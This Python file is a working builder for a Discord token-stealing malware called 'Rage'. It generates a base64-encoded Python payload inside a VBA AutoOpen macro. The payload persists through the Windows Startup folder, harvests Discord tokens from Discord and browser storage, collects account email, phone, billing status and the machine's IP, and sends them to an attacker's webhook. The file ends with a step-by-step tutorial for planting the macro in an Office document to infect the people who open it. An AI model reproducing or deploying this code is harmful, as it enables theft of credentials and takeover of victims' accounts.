from pystyle import Anime, Colorate, Colors, Center, System, Write

from base64 import b64encode
from pyperclip import copy


def mkscript(webhook: str, ping: bool) -> str:
    code =  r"""# by billythegoat356

# https://github.com/billythegoat356/Rage



from urllib.request import urlopen, Request
from urllib.error import HTTPError
from os import getenv, listdir, startfile, remove
from os.path import isdir, isfile
from re import findall

from json import loads, dumps
from shutil import copy



path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/rage.pyw" % getenv("userprofile")


if not isfile(path):
    copy(__file__, path)
    startfile(path)
    remove(__file__)
    exit()
elif __file__.replace('\\', '/') != path.replace('\\', '/'):
    exit()


webhook = '""" + webhook + r"""'
pingme = """ + str(ping) + r"""


class Discord:

    def setheaders(token: str = None) -> dict:
        headers = {'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
        if token:
            headers['authorization'] = token
        return headers

    def get_tokens() -> list:
        tokens = []
        LOCAL = getenv("LOCALAPPDATA")
        ROAMING = getenv("APPDATA")
        PATHS = {
            "Discord": ROAMING + "\\Discord",
            "Discord Canary": ROAMING + "\\discordcanary",
            "Discord PTB": ROAMING + "\\discordptb",
            "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera": ROAMING + "\\Opera Software\\Opera Stable",
            "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }

        def search(path: str) -> list:
            path += "\\Local Storage\\leveldb"
            found_tokens = []
            if isdir(path):
                for file_name in listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                try: 
                                    urlopen(Request(
                                        "https://discord.com/api/v9/users/@me",
                                        headers=Discord.setheaders(token)))
                                except HTTPError:
                                    continue
                                if token not in found_tokens and token not in tokens:
                                    found_tokens.append(token)

            return found_tokens

        for path in PATHS:
            for token in search(PATHS[path]):
                tokens.append(token)
        return tokens

class Grab:

    def token_grab(token: str):
        def getavatar(uid, aid) -> str:
            url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}"
            try:
                urlopen(Request(url, headers=Discord.setheaders()))
            except HTTPError:
                url += ".gif"
            return url

        def has_payment_methods(token) -> bool:
            has = False
            try:
                has = bool(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                           headers=Discord.setheaders(token))).read()))
            except:
                pass
            return has

        valid, invalid = "<:valide:858700826499219466>", "<:invalide:858700726905733120>"

        def verify(var):
            return valid if var else invalid

        user_data = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me",
                        headers=Discord.setheaders(token))).read())
        ip = loads(urlopen(Request('http://ipinfo.io/json')).read())['ip']
        computer_username = getenv("username")
        username = user_data["username"] + \
            "#" + str(user_data["discriminator"])
        user_id = user_data["id"]
        avatar_id = user_data["avatar"]
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
        email = user_data.get("email")
        phone = user_data.get("phone")
        mfa_enabled = bool(user_data['mfa_enabled'])
        email_verified = bool(user_data['verified'])
        billing = bool(has_payment_methods(token))
        nitro = bool(user_data.get("premium_type"))

        nitro = valid if nitro else invalid
        email_verified = verify(email_verified)
        billing = verify(billing)
        mfa_enabled = verify(mfa_enabled)

        if not phone:
            phone = invalid

        data = [{
            "title": "Rage",
            "description": "Grabbed!",
            "url": "https://github.com/billythegoat356/Rage",
            "image": {
                "url": "https://repository-images.githubusercontent.com/431654731/72e437c2-c3ed-4b68-994a-a88b7b6c1bfb"
            },
            "color": 0xCB4335,
            "fields": [
                {
                    "name": "**Infos Du Compte**",
                            "value": f'Email: {email}\nTéléphone: {phone}\nPaiement: {billing}',
                            "inline": True
                },
                {
                    "name": "**Infos du PC**",
                            "value": f"IP: {ip}\nUtilisateur: {computer_username}",
                            "inline": True
                },
                {
                    "name": "**Infos Supplémentaires**",
                            "value": f'Nitro: {nitro}\n2FA: {mfa_enabled}',
                            "inline": False
                },
                {
                    "name": "**Token**",
                            "value": f"||{token}||",
                            "inline": False
                }
            ],
            "author": {
                "name": f"{username}",
                        "icon_url": avatar_url
            },

            "thumbnail": {
                "url": "https://repository-images.githubusercontent.com/431654731/72e437c2-c3ed-4b68-994a-a88b7b6c1bfb"
            },

            "footer": {
                "text": "by billythegoat356"
            }
        }]
        Grab.send(data)

    def send(data: str):
        data = {"username": "Rage",
                "avatar_url": "https://repository-images.githubusercontent.com/431654731/72e437c2-c3ed-4b68-994a-a88b7b6c1bfb",
                "embeds": data,
                "content": "@everyone" if pingme else ""}
        return urlopen(Request(webhook, data=dumps(data).encode('utf-8'), headers=Discord.setheaders()))


sent_tokens = []

def token_grab():
    for token in Discord.get_tokens():
        if token not in sent_tokens:
            Grab.token_grab(token)
        sent_tokens.append(token)


ready_data = [{
    "title": "Rage",
    "description": "Initialized!",
    "url": "https://github.com/billythegoat356/Rage",
    "image": {
        "url": "https://repository-images.githubusercontent.com/431654731/72e437c2-c3ed-4b68-994a-a88b7b6c1bfb"
    },
    "color": 0xCB4335,
    "fields": [
        {
            "name": "**Ready!**",
            "value": 'I am ready to find some tokens!',
            "inline": True
        }
    ],

    "thumbnail": {
        "url": "https://repository-images.githubusercontent.com/431654731/72e437c2-c3ed-4b68-994a-a88b7b6c1bfb"
    },

    "footer": {
        "text": "by billythegoat356"
    }
}]

Grab.send(ready_data)


while True:
    if not isfile(__file__):
        exit()
    token_grab()
"""

    e = b64encode(code.encode('cp850')).decode('cp850')

    encoded = [e[:900], e[900:1800], e[1800:2700], e[2700:3600], e[3600:4500], e[4500:5400], e[5400:6300], e[6300:7200], e[7200:8100], e[8100:9000], e[9000:9900], e[9900:]]

    script = []

    for _ in range(len(encoded)):
        chars = ""
        for char in encoded[0]:
            chars += char
        encoded = [l for l in encoded[1:]]
        script.append(chars)


    vba =  """
Sub AutoOpen()
    myFile = "_rage.py"
    Open myFile For Output As #1
    """
        
    vba += f"""Print #1, "b64list=''.join('''"
    """

    for line in script:
        vba += f"""Print #1, "{line}"
    """

    vba += f"""Print #1, "'''.splitlines());exec(__import__('base64').b64decode(b64list).decode('cp850'))"
    """

    vba += """Close #1
    Shell ("python _rage.py")
        
End Sub"""
    return vba





banner = r"""
                                                                            .+ss                  
                                                                            `sNMMy                  
                                                                         `.+NMMMM:`                 
                                                                       /hNMMMMMMMMNo                
                       `-:+syyhyyso+/:..-::::--.`                  .+ymMMMMMMMMMMMMM/               
              -/+oyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMo`             
      `-:+oydNMMMMMMMMMMMMMMMMMMMMmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNh+`          
    +mNNMMMMMMMMMMMMMMMMMMMMMMMNy:/MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmmNNMMMMMMd.          
     .+hmMMMMMMMMMMMMMMMMMMNho+. :NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs.````.-/+/.`           
        `-/+oooshddddNmdys+.     +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs                        
                `````.``         `NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs`                        
                                  oMMMMMMMMMMdmMMMMMMMMMMMMMMMMMMMMMMMMMNo                          
                                `-+MMMMMMMMMd`.-+yNMMMMMMMMMMMMMMMMMMMMN:                           
                            .-/sdNMMMMMMMMMM/     ./sdmNMMMMMMMMMMMMMMMh                            
                           /mMMMNNmmMMMMMMm/          `.oNMMMMMy++MMMMM/                            
                           mMMy:-..+MMMMd/`              :hNMMM+ -NMMMM:                            
                         `oMMs    .mMMh:`                  +MMMm` -hMMMd                            
                       :ohNd/     oMMM-             .-.../yNMMNd`  `sMMM/                           
                      .yyo-        /NMN/`          -NMMMNMNdo:.      oMMm.                          
                                    .yMMdo:`        ./syo/.           sMMNo..`                      
                                      /dMMMd                           :dMMMMN-                     
                                        ./+:                             `..--""".replace('M', 'R')[1:]


ascii_art = """
    .:'/*/'`:,·:~·–:.,                        ,.-:~:-.                             __'                             ,.-:~:'*:~-.°  
   /::/:/:::/:::;::::::/`':.,'                /':::::::::'`,                    ,.·:'´::::::::`'·-.                  .·´:::::::::::::::;  
 /·*'`·´¯'`^·-~·:–-'::;:::'`;             /;:-·~·-:;':::',                 '/::::::::::::::::::';               /::;:-·~^*^~-:;:/ ° 
 '\                       '`;::'i‘         ,'´          '`:;::`,              /;:· '´ ¯¯  `' ·-:::/'           ,.-/:´     .,       ;/     
   '`;        ,– .,        'i:'/         /                `;::\           /.'´      _         ';/' ‘         /::';      ,'::`:~.-:´;     
     i       i':/:::';       ;/'        ,'                   '`,::;       ,:     ,:'´::;'`·.,_.·'´.,    ‘     /;:- ´        `'·–·;:'/' _   
     i       i/:·'´       ,:''         i'       ,';´'`;         '\:::', ‘  /     /':::::/;::::_::::::::;‘    /     ;:'`:.., __,.·'::/:::';  
     '; '    ,:,     ~;'´:::'`:,    ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘  ;'      ';:::::::::::::::/;;::/  
     'i      i:/\       `;::::/:'`;' ;        ;/:;::;:';         ',:::;'i     ';::::::'\             ';:';‘  ¦         '`·-·:;::·-·'´   ';:/‘  
      ;     ;/   \       '`:/::::/''i        '´        `'         'i::'/ ;      '`·:;:::::`'*;:'´      |/'   '\                         /'    
      ';   ,'       \         '`;/' ¦       '/`' *^~-·'´\         ';'/'‚  \          '`*^*'´         /'  ‘    `·,                  ,·'  '    
       `'*´          '`~·-·^'´    '`., .·´              `·.,_,.·´  ‚    `·.,               ,.-·´             '`~·- . , . -·'´          
                                                                             '`*^~·~^*'´"""[1:]


def init():
    System.Clear()
    System.Title("Rage")
    System.Size(200, 60)
    Anime.Fade(text=Center.Center(banner), color=Colors.red_to_purple, mode=Colorate.Vertical, enter=True)


def w(text: str):
    Write.Input(text=text, color=Colors.red_to_purple, interval=0.005, input_color=Colors.white)

def main(start: bool = False, script: str = None):
    System.Clear()
    print('\n'*2)
    print(Colorate.Diagonal(Colors.red_to_purple, Center.XCenter(ascii_art)))
    print('\n'*3)

    if not start:
        webhook = Write.Input("Enter your webhook -> ",
                          Colors.purple_to_red, interval=0.005, end=Colors.reset)
        if not webhook.strip():
            Colorate.Error("Please enter a valid webhook!")
            return

        ping = Write.Input("Would you like to get pinged when you get a hit [y/n] -> ",
                        Colors.purple_to_red, interval=0.005, end=Colors.reset)
        
        if ping not in ('y', 'n'):
            Colorate.Error("Please enter either 'y' or 'n'!")
            return
        
        ping = ping == 'y'

        print()

        w("Press enter to start the tutorial...")
        return main(start=True, script=mkscript(webhook=webhook, ping=ping))
    else:
        w("First of all, create/open a Microsoft Document (Word, Powerpoint, anything you want).")
        print()
        w("Save it as a Microsoft Document with macros.")
        print()
        w("Then, open the file. Go in 'View' pannel, then click on 'Macros'.")
        print()
        w("Add a new macro. Name it 'AutoOpen', and be sure to select 'Only for this document'. Then, click on 'Create'.")
        print()
        copy(script)
        w("After, it will open a window showing some code. Select the code, press Ctrl + A then Ctrl + V.")
        print()
        w("Finally, you can save the file and exit.")
        print()
        w("Now, when someone downloads and executes the file, it will execute the malicious code and send you their Discord token (only if they have Python3 installed).")


    return exit()



if __name__ == '__main__':
    init()
    while True:
        main()
